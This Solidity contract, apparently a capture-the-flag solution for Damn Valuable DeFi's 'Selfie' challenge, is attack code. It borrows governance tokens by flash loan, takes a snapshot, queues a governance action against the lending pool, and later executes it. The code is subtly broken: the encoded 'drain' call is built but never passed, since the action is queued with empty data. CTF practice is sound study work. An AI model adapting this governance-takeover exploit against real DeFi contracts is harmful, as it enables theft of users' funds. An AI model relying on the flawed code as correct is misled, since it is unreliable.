// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    address private attacker;
    uint256 public actionId;

    constructor(address poolAddress, address governanceAddress, address tokenAddress) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
        attacker = msg.sender;
    }

    function attack(uint256 amount) external {
        // Borrow the tokens needed for the attack using a flash loan
        bytes memory data = abi.encodeWithSignature("drain(address)", address(this));
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)), // The _receiver of the flash loan
            address(token), // The _token to be borrowed
            amount, // The _amount of tokens to borrow
            data // The _data parameter containing the function signature
        );
    }

    function onFlashLoan(
        address, // initiator - not used
        address _token,
        uint256 amount,
        uint256, // fee - not used
        bytes calldata // data - not used
    ) external override returns (bytes32) {
        require(msg.sender == address(pool), "Not the loan initiator");
        require(_token == address(token), "Wrong token");
        require(amount <= token.balanceOf(address(pool)), "Insufficient balance");

        uint256 lastSnapshotId = token.snapshot();
        actionId = governance.queueAction(address(pool), 0, "");
        token.transfer(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function finalizeAttack() external {
        governance.executeAction(actionId);
    }

    fallback() external payable {}
    receive() external payable {}
}
